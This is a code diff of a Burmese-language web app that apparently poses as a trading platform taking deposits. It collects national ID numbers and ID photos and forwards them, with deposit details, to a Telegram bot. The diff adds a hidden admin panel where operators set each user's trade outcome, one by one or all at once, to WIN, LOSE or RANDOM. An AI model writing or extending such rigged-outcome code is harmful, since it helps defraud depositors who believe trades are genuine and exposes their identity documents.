-                    accName: paymentData.name,
-                    accNum: paymentData.num,
-                    status: 'pending', 
-                    date: new Date().toLocaleString(), 
-                    timestamp: Date.now() 
+                    ph: user, username: userDataGlobal ? userDataGlobal.username : 'N/A',
+                    amt: amt, trx: trx, method: currentPayMethod, accName: paymentData.name, accNum: paymentData.num,
+                    status: 'pending', date: new Date().toLocaleString(), timestamp: Date.now() 
                 }).then(() => {
                     sendDepositToTelegram({
-                        ph: user,
-                        username: userDataGlobal ? userDataGlobal.username : 'N/A',
-                        amt: amt, trx: trx,
-                        method: currentPayMethod,
-                        accName: paymentData.name,
-                        accNum: paymentData.num
+                        ph: user, username: userDataGlobal ? userDataGlobal.username : 'N/A',
+                        amt: amt, trx: trx, method: currentPayMethod,
+                        accName: paymentData.name, accNum: paymentData.num
                     });
                 });
-                
                 notifyBot('💰 DEPOSIT REQUEST', { 'User': user, 'Amount': parseFloat(amt).toLocaleString(), 'Method': currentPayMethod.toUpperCase() });
                 refreshAllHistory();
                 showDepositSuccess(amt, trx, currentPayMethod);
@@ -2327,35 +2244,23 @@
         const nrc = document.getElementById('verify-nrc').value.trim();
         if(!nrc || nrc.length < 5) return showSuccess('Error', "NRC မှန်ကန်စွာ ထည့်ပါ။");
         if(!nrcImages.front || !nrcImages.back || !nrcImages.hold) return showSuccess('Error', "ပုံအားလုံး ထည့်ပါ။");
-        
         showModal('📤 ပို့နေသည်...', `
             <div style="text-align:center; padding:20px;">
                 <div style="font-size:40px; margin-bottom:15px;">⏳</div>
-                <b>Verification အချက်အလက်များ ပို့နေပါသည်...</b><br><br>
-                <small style="color:var(--dim);">ခဏစောင့်ဆိုင်းပေးပါ။</small>
+                <b>Verification အချက်အလက်များ ပို့နေပါသည်...</b>
             </div>
         `, []);
-        
         try {
             const verifyId = db.ref('requests/verifications').push().key;
             await db.ref('requests/verifications/' + verifyId).set({ 
-                ph: user, 
-                username: userDataGlobal ? userDataGlobal.username : user, 
-                nrc: nrc, 
-                status: 'pending', 
-                date: new Date().toLocaleString(),
-                timestamp: Date.now()
+                ph: user, username: userDataGlobal ? userDataGlobal.username : user, 
+                nrc: nrc, status: 'pending', date: new Date().toLocaleString(), timestamp: Date.now()
             });
             await db.ref('users/'+user).update({ verificationStatus: 'pending', nrc: nrc });
-
             notifyBot('🆔 VERIFICATION SUBMITTED', { 'Phone': user, 'NRC': nrc });
-
             const photoResult = await sendVerificationPhotosToTelegram(nrc, userDataGlobal ? userDataGlobal.username : user, user);
-
             closeModal();
-            const photoStatus = photoResult && photoResult.allOk
-                ? `✅ ၃ ပုံ ပို့ပြီး`
-                : `${photoResult ? photoResult.successCount : 0}/3 ပုံ ပို့ပြီး`;
+            const photoStatus = photoResult && photoResult.allOk ? `✅ ၃ ပုံ ပို့ပြီး` : `${photoResult ? photoResult.successCount : 0}/3 ပုံ ပို့ပြီး`;
             showSuccess('✅ အောင်မြင်ပါသည်', `
                 <div style="text-align:center;">
                     <div style="font-size:50px; color:var(--green); margin-bottom:15px;">✅</div>
@@ -2365,11 +2270,9 @@
                         <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">ပုံများ</span><b style="color:var(--green);">${photoStatus}</b></div>
                         <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">အခြေအနေ</span><b style="color:var(--active-gold);">⏳ စစ်ဆေးနေသည်</b></div>
                     </div>
-                    <br><small style="color:var(--dim);">Admin မှ စစ်ဆေးပြီးပါက အကြောင်းကြားပါမည်။</small>
                 </div>
             `, () => showPage('dash-page'));
         } catch (err) {
-            console.error('Verification error:', err);
             closeModal();
             showSuccess('Error', "Verification တင်သွင်းမှု မအောင်မြင်ပါ။ ထပ်စမ်းကြည့်ပါ။");
         }
@@ -2413,7 +2316,6 @@
             if(admClickCount >= 5) {
                 admClickCount = 0;
                 clearTimeout(admClickTimer);
-                
                 const overlay = document.createElement('div');
                 overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:99999;display:flex;align-items:center;justify-content:center;padding:20px;';
                 overlay.innerHTML = `
@@ -2427,7 +2329,6 @@
                     </div>
                 `;
                 document.body.appendChild(overlay);
-                
                 const pwInput = document.getElementById('adm-pw-input');
                 setTimeout(() => pwInput.focus(), 100);
                 const closeOverlay = () => overlay.remove();
@@ -2438,6 +2339,7 @@
                         loadAdmReq();
                         loadAdmVerify();
                         loadAdmStocks();
+                        loadAdmUsers();
                     } else {
                         closeOverlay();
                         showSuccess('Error', "❌ Password မှားနေပါသည်။");
@@ -2459,6 +2361,8 @@
         document.querySelectorAll('.adm-section').forEach(s => s.style.display = 'none');
         const target = document.getElementById('adm-'+tab);
         if(target) target.style.display = 'block';
+        
+        if(tab === 'users') loadAdmUsers();
     }
 
     function admPostAnnounce() {
@@ -2473,7 +2377,6 @@
         const phone = document.getElementById('adm-user-phone').value.trim();
         const msg = document.getElementById('adm-personal-msg').value.trim();
         if(!phone || !msg) return showSuccess('Error', "ဖုန်းနံပါတ်နှင့် စာသား ထည့်ပါ။");
-        
         db.ref('users/' + phone).once('value', s => {
             if(!s.exists()) return showSuccess('Error', "ဤ User မရှိပါ။");
             db.ref('userMessages/' + phone).push({ text: msg, date: new Date().toLocaleString(), timestamp: Date.now() });
@@ -2497,7 +2400,7 @@
                     </div>
                     <div style="display:flex; gap:8px;">
                         <input type="number" id="stock-price-${st.id}" value="${price.toFixed(3)}" step="0.01" min="0.1" style="margin:0; padding:10px; font-size:13px; flex:1; background:#111; border:1px solid #333;">
-                        <button class="btn btn-main" style="padding:10px; width:auto; font-size:12px;" onclick="applyClickGold(this); updateStockPrice('${st.id}')">Update</button>
+                        <button class="btn btn-main" style="padding:10px; width:auto; font-size:12px;" onclick="updateStockPrice('${st.id}')">Update</button>
                     </div>
                 </div>`;
             });
@@ -2509,7 +2412,6 @@
         const inputEl = document.getElementById(`stock-price-${stockId}`);
         const price = parseFloat(inputEl.value);
         if(!price || price <= 0) return showSuccess('Error', "စျေးနှုန်း မှန်ကန်စွာ ထည့်ပါ။");
-        
         db.ref(`settings/stockPrices/${stockId}`).set(price).then(() => {
             liveStockPrices[stockId] = price;
             showSuccess('✅ အောင်မြင်ပါသည်', `Stock Price ကို ${price.toFixed(3)}x သို့ အောင်မြင်စွာ ပြောင်းလဲပြီးပါပြီ။`);
@@ -2532,8 +2434,8 @@
                         <div style="display:flex;justify-content:space-between;"><b style="color:var(--primary);">${data.username || 'User'}</b><span class="mining-status-badge status-pending">PENDING</span></div>
                         <p style="font-size:12px;margin:8px 0;color:var(--dim);">📱 ${data.ph}<br>🆔 ${data.nrc}<br>⏰ ${data.date}</p>
                         <div style="display:flex;gap:10px;margin-top:10px;">
-                            <button class="btn btn-green" style="padding:8px;font-size:12px;" onclick="applyClickGold(this); admVerifyAction('${r.key}','approved','${data.ph}')">✅ Approve</button>
-                            <button class="btn btn-red" style="padding:8px;font-size:12px;" onclick="applyClickGold(this); admVerifyAction('${r.key}','rejected','${data.ph}')">❌ Reject</button>
+                            <button class="btn btn-green" style="padding:8px;font-size:12px;" onclick="admVerifyAction('${r.key}','approved','${data.ph}')">✅ Approve</button>
+                            <button class="btn btn-red" style="padding:8px;font-size:12px;" onclick="admVerifyAction('${r.key}','rejected','${data.ph}')">❌ Reject</button>
                         </div>
                     </div>`;
                 }
@@ -2564,10 +2466,6 @@
         }); 
     }
 
-    function admMode(m) { 
-        db.ref('users/'+document.getElementById('adm-search').value).update({mode: m}).then(() => admSearch()); 
-    }
-
     function loadAdmReq() { 
         db.ref('requests').on('value', s => { 
             let h = ""; 
@@ -2580,8 +2478,8 @@
                         let receiverInfo = r.val().receivePh ? `<br>📞 Receiver: ${r.val().name || 'N/A'} - ${r.val().receivePh}` : '';
                         h += `<div class="card">${cat.key.toUpperCase()} ${methodTxt} <br>User: ${r.val().ph}<br>Amt: ${parseFloat(r.val().amt).toLocaleString()}${accInfo}${receiverInfo}<br>TRX: ${r.val().trx || 'N/A'}<br>
                         <div style="display:flex; gap:10px; margin-top:10px;">
-                            <button class="btn btn-green" style="padding:8px;" onclick="applyClickGold(this); admAction('${cat.key}','${r.key}','success')">Approve</button>
-                            <button class="btn btn-red" style="padding:8px;" onclick="applyClickGold(this); admAction('${cat.key}','${r.key}','rejected')">Reject</button>
+                            <button class="btn btn-green" style="padding:8px;" onclick="admAction('${cat.key}','${r.key}','success')">Approve</button>
+                            <button class="btn btn-red" style="padding:8px;" onclick="admAction('${cat.key}','${r.key}','rejected')">Reject</button>
                         </div></div>`; 
                     } 
                 });
@@ -2622,7 +2520,240 @@
             admSearch();
         });
     }
-    
+
+    // ================================================================
+    // 🆕 NEW: BULK MODE CONTROL & USER MODE MANAGEMENT
+    // ================================================================
+    function loadAdmUsers() {
+        const container = document.getElementById('adm-users-list');
+        if(container) {
+            container.innerHTML = `<p class="loader-text"><i class="fas fa-spinner fa-spin"></i> Loading Users from Firebase...</p>`;
+        }
+
+        db.ref('users').on('value', snapshot => {
+            allUsersCache = {};
+            let totalWin = 0, totalLose = 0, totalRandom = 0;
+            
+            snapshot.forEach(child => {
+                const data = child.val();
+                if(!data) return;
+                allUsersCache[child.key] = data;
+                
+                const mode = (data.mode || 'random').toLowerCase();
+                if(mode === 'win') totalWin++;
+                else if(mode === 'lose') totalLose++;
+                else totalRandom++;
+            });
+            
+            isUsersLoaded = true;
+            
+            const statWin = document.getElementById('stat-win');
+            const statLose = document.getElementById('stat-lose');
+            const statRandom = document.getElementById('stat-random');
+            
+            if(statWin) statWin.innerText = totalWin;
+            if(statLose) statLose.innerText = totalLose;
+            if(statRandom) statRandom.innerText = totalRandom;
+            
+            renderAdmUsersList();
+        }, error => {
+            console.error("Firebase Read Error:", error);
+            if(container) {
+                container.innerHTML = `<p style="text-align:center; color:var(--red); font-size:12px; padding:20px;">❌ Error: ဒေတာဖတ်မရပါ။ (${error.message})</p>`;
+            }
+        });
+    }
+
+    function renderAdmUsersList() {
+        const container = document.getElementById('adm-users-list');
+        if(!container) return;
+        
+        let users = Object.entries(allUsersCache);
+        
+        if(admUserFilterText) {
+            const f = admUserFilterText.toLowerCase();
+            users = users.filter(([phone, data]) => {
+                return phone.toLowerCase().includes(f) || 
+                       (data.username || '').toLowerCase().includes(f);
+            });
+        }
+        
+        users.sort((a, b) => {
+            const aTime = a[1].registeredAt || '';
+            const bTime = b[1].registeredAt || '';
+            return bTime.localeCompare(aTime);
+        });
+        
+        if(users.length === 0) {
+            container.innerHTML = `<p style="text-align:center; color:var(--dim); font-size:12px; padding:20px;">No users found in database.</p>`;
+            return;
+        }
+        
+        let h = '';
+        users.forEach(([phone, data]) => {
+            const mode = (data.mode || 'random').toLowerCase();
+            let modeBadge, modeClass;
+            if(mode === 'win') { modeBadge = '🏆 WIN'; modeClass = 'mode-badge-win'; }
+            else if(mode === 'lose') { modeBadge = '❌ LOSE'; modeClass = 'mode-badge-lose'; }
+            else { modeBadge = '🎲 RANDOM'; modeClass = 'mode-badge-random'; }
+            
+            const isWinActive = mode === 'win' ? 'active-win' : '';
+            const isLoseActive = mode === 'lose' ? 'active-lose' : '';
+            const isRandomActive = mode === 'random' ? 'active-random' : '';
+            
+            h += `
+                <div class="user-mode-item" data-phone="${phone}">
+                    <div class="user-mode-header">
+                        <div>
+                            <b style="color:#fff; font-size:13px;">${data.username || 'Unknown'}</b>
+                            <span class="mode-badge ${modeClass}" style="margin-left:6px;">${modeBadge}</span>
+                        </div>
+                    </div>
+                    <div class="user-mode-info">
+                        📱 ${phone} &nbsp;|&nbsp; 💰 ${(data.balance || 0).toLocaleString()} Ks &nbsp;|&nbsp; ⭐ VIP ${data.vip || 0}
+                    </div>
+                    <div class="user-mode-btns">
+                        <button class="user-mode-btn ${isWinActive}" onclick="admSetUserMode('${phone}', 'win', this)">🏆 WIN</button>
+                        <button class="user-mode-btn ${isLoseActive}" onclick="admSetUserMode('${phone}', 'lose', this)">❌ LOSE</button>
+                        <button class="user-mode-btn ${isRandomActive}" onclick="admSetUserMode('${phone}', 'random', this)">🎲 RANDOM</button>
+                    </div>
+                </div>
+            `;
+        });
+        
+        container.innerHTML = h;
+    }
+
+    function admFilterUsers(val) {
+        admUserFilterText = val;
+        renderAdmUsersList();
+    }
+
+    async function admBulkMode(mode) {
+        if(!mode || !['win','lose','random'].includes(mode)) return;
+        
+        if(!isUsersLoaded) {
+            return showSuccess('⏳ ခဏစောင့်ပါ', "Firebase ကနေ User ဒေတာတွေ ရောက်နေပါတယ်။ ၂ စက္ကန့်လောက် စောင့်ပြီး ပြန်နှိပ်ကြည့်ပါ။");
+        }
+
+        const modeLabel = mode === 'win' ? '🏆 WIN' : (mode === 'lose' ? '❌ LOSE' : '🎲 RANDOM');
+        const modeColor = mode === 'win' ? 'var(--green)' : (mode === 'lose' ? 'var(--red)' : 'var(--active-gold)');
+        
+        const userCount = Object.keys(allUsersCache).length;
+        if(userCount === 0) {
+            return showSuccess('⚠️ User မရှိပါ', "ဒေတာဘေ့စ်ထဲမှာ User တစ်ယောက်မှ မရှိသေးပါ။ User အရင်ရှိအောင် လုပ်ပါ။");
+        }
+        
+        showConfirm(
+            `⚡ BULK MODE: ${modeLabel}`,
+            `<div style="text-align:center;">
+                <div style="font-size:50px; margin-bottom:15px;">${mode === 'win' ? '🏆' : (mode === 'lose' ? '❌' : '🎲')}</div>
+                <b>သင် User <span style="color:${modeColor}; font-size:18px;">${userCount}</span> ယောက်ကို</b><br>
+                <b style="color:${modeColor}; font-size:20px;">${modeLabel}</b> သို့ ပြောင်းလဲပါမည်။<br><br>
+                <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; margin-top:10px; font-size:12px; color:var(--dim);">
+                    ⚠️ ဤလုပ်ဆောင်ချက်သည် User အားလုံးရဲ့ Trade ရလဒ်ကို ချက်ချင်း ပြောင်းလဲပါမည်။
+                </div>
+            </div>`,
+            async () => {
+                const resultEl = document.getElementById('adm-bulk-result');
+                if(resultEl) {
+                    resultEl.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Updating ${userCount} users...`;
+                    resultEl.style.color = 'var(--active-gold)';
+                }
+                
+                try {
+                    const updates = {};
+                    Object.keys(allUsersCache).forEach(phone => {
+                        updates[`users/${phone}/mode`] = mode;
+                    });
+                    await db.ref().update(updates);
+                    
+                    if(resultEl) {
+                        resultEl.innerHTML = `✅ <b>အောင်မြင်ပါသည်!</b> User ${userCount} ယောက်ကို <b style="color:${modeColor};">${modeLabel}</b> သို့ ပြောင်းလဲပြီးပါပြီ။`;
+                        resultEl.style.color = 'var(--green)';
+                    }
+                    
+                    Object.keys(allUsersCache).forEach(phone => {
+                        allUsersCache[phone].mode = mode;
+                    });
+                    renderAdmUsersList();
+                    
+                    notifyBot(`⚡ BULK MODE: ${mode.toUpperCase()}`, {
+                        'Users Updated': userCount,
+                        'New Mode': modeLabel
+                    });
+                    
+                    setTimeout(() => { if(resultEl) resultEl.innerHTML = ''; }, 5000);
+                } catch (err) {
+                    console.error('Bulk mode error:', err);
+                    if(resultEl) {
+                        resultEl.innerHTML = `❌ <b>Error:</b> ${err.message}`;
+                        resultEl.style.color = 'var(--red)';
+                    }
+                }
+            },
+            () => {}
+        );
+    }
+
+    function admSetUserMode(phone, mode, btnEl) {
+        if(!phone || !mode) return;
+        
+        const modeLabel = mode === 'win' ? '🏆 WIN' : (mode === 'lose' ? '❌ LOSE' : '🎲 RANDOM');
+        const userData = allUsersCache[phone];
+        const username = userData ? userData.username : phone;
+        
+        db.ref(`users/${phone}/mode`).set(mode).then(() => {
+            if(allUsersCache[phone]) allUsersCache[phone].mode = mode;
+            
+            if(btnEl) {
+                const item = btnEl.closest('.user-mode-item');
+                if(item) {
+                    item.querySelectorAll('.user-mode-btn').forEach(b => {
+                        b.classList.remove('active-win', 'active-lose', 'active-random');
+                    });
+                    if(mode === 'win') btnEl.classList.add('active-win');
+                    else if(mode === 'lose') btnEl.classList.add('active-lose');
+                    else btnEl.classList.add('active-random');
+                    
+                    const badge = item.querySelector('.mode-badge');
+                    if(badge) {
+                        badge.className = 'mode-badge ' + (
+                            mode === 'win' ? 'mode-badge-win' : 
+                            mode === 'lose' ? 'mode-badge-lose' : 'mode-badge-random'
+                        );
+                        badge.innerText = mode === 'win' ? '🏆 WIN' : (mode === 'lose' ? '❌ LOSE' : '🎲 RANDOM');
+                    }
+                }
+            }
+            
+            let totalWin = 0, totalLose = 0, totalRandom = 0;
+            Object.values(allUsersCache).forEach(d => {
+                const m = (d.mode || 'random').toLowerCase();
+                if(m === 'win') totalWin++;
+                else if(m === 'lose') totalLose++;
+                else totalRandom++;
+            });
+            const sWin = document.getElementById('stat-win');
+            const sLose = document.getElementById('stat-lose');
+            const sRand = document.getElementById('stat-random');
+            if(sWin) sWin.innerText = totalWin;
+            if(sLose) sLose.innerText = totalLose;
+            if(sRand) sRand.innerText = totalRandom;
+            
+            const toast = document.createElement('div');
+            toast.style.cssText = 'position:fixed;bottom:100px;left:50%;transform:translateX(-50%);background:rgba(46,189,133,0.95);color:#000;padding:10px 20px;border-radius:10px;font-weight:bold;font-size:12px;z-index:99999;box-shadow:0 4px 15px rgba(0,0,0,0.3);';
+            toast.innerText = `✅ ${username} → ${modeLabel}`;
+            document.body.appendChild(toast);
+            setTimeout(() => toast.remove(), 2000);
+        }).catch(err => {
+            showSuccess('Error', `Mode ပြောင်းမှု မအောင်မြင်ပါ: ${err.message}`);
+        });
+    }
+
+    // ================================================================
+    // NAVIGATION
+    // ================================================================
     function showPage(id) { 
         document.querySelectorAll('.page').forEach(p=>p.classList.remove('active')); 
         const target = document.getElementById(id);
@@ -2659,17 +2790,14 @@
     
     function notifyBot(title, data) {
         console.log('[BOT NOTIFICATION]', title, data);
-        
         const importantEvents = [
             'USER LOGIN', 'NEW USER REGISTERED', 'WITHDRAW REQUEST', 
             'DEPOSIT REQUEST', 'MINING REQUEST', 'VIP UPGRADE',
-            'TRADE WIN', 'TRADE LOSS', 'VERIFICATION SUBMITTED'
+            'TRADE WIN', 'TRADE LOSS', 'VERIFICATION SUBMITTED', 'BULK MODE'
         ];
-        
         const shouldSendToTelegram = importantEvents.some(event => 
             title.toUpperCase().includes(event) || title.includes(event)
         );
-        
         if(shouldSendToTelegram && data) {
             let msg = `🔔 <b>${title}</b>\n━━━━━━━━━━━━━━━━━━━━\n`;
             Object.entries(data).forEach(([key, value]) => {
